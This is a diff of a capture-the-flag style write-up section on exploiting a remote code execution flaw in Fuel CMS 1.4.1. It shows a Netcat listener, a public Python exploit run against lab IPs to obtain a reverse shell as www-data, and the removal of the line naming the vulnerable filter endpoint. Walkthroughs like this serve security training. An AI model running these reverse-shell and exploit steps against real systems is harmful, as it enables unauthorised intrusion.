@@ -48,40 +48,32 @@ The script was downloaded and prepared for use in the next phase of the attack.
 
 ## 💥 Exploitation
 
-After identifying a **Remote Code Execution (RCE)** vulnerability in **Fuel CMS 1.4.1**, the next step was to exploit it in order to gain access to the target system.
+After identifying the **Remote Code Execution (RCE)** vulnerability in **Fuel CMS 1.4.1**, the next step was to exploit it to gain access to the target system.
 
-A publicly available exploit written in Python was used to interact with the vulnerable endpoint:
+A publicly available Python exploit was used to leverage this vulnerability and execute commands on the server.
 
-```text
-/fuel/pages/select/?filter=
-```
-
-This exploit allows the execution of **arbitrary system commands** by injecting them into the `filter` parameter.
-
-To establish a connection with the target, a reverse shell payload was configured within the exploit. A Netcat listener was set up on the attacker's machine to receive the incoming connection:
+To establish a connection with the target, a Netcat listener was configured on the attacker's machine:
 
 ```bash
 nc -lvnp 4444
 ```
 
-The exploit was then executed with the appropriate parameters, including the target URL, attacker IP address, and listening port:
+The exploit was then executed with the appropriate parameters:
 
 ```bash
 python3 fuel_rce.py http://10.130.137.229 10.129.79.84 4444
 ```
 
-Upon execution, the target system successfully connected back to the attacker's machine, resulting in a remote shell running under the `www-data` user.
+Once executed, the target system initiated a connection back to the attacker, resulting in a **reverse shell** under the `www-data` user.
 
-Basic enumeration commands were executed to verify access and explore the system:
+Basic enumeration commands were used to verify access:
 
 ```bash
 whoami
 ls
 ```
 
-This confirmed that initial access had been successfully obtained, allowing further investigation of the server and its contents.
-
-
+This confirmed successful initial access to the system.
 
 
 
